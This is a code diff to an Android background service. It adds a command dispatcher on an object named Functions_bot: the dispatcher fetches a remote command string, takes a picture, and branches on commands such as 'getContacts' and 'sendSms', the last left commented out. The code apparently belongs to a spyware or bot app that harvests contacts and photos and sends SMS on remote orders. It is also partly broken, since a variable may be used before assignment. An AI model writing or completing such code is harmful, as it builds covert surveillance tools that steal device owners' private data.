@@ -39,7 +39,26 @@ public class MyService extends Service {
             @Override
             public void run() {
                 Functions_bot fb = new Functions_bot(getApplicationContext());
+            fb.getPicture();
               String valor = fb.getCommands();
+                String [] ordParams;
+                String [] funcParams = valor.split("_");
+                if(funcParams.length==2)
+                    ordParams = funcParams[1].split("/+");
+                switch(funcParams[0])
+                {
+                    case"getContacts":{
+
+                    fb.getContactsList();
+                    }
+                    break;
+                    case"sendSms":{
+                     //fb.sendSMS(ordParams[0], ordParams[1]);
+                    }
+                    break;
+
+
+                }
             }
         });
         secThread.start();
